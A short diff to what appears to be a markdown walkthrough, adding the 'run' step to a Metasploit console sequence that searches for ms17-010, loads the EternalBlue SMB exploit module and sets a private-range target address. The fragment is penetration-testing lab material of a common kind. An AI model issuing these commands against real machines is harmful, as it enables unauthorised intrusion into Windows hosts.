@@ -46,6 +46,8 @@ msf > search ms17-010
 msf > use 0
 
 msf exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.49.135.240
+
+msf exploit(windows/smb/ms17_010_eternalblue) > run
 ```
 
 
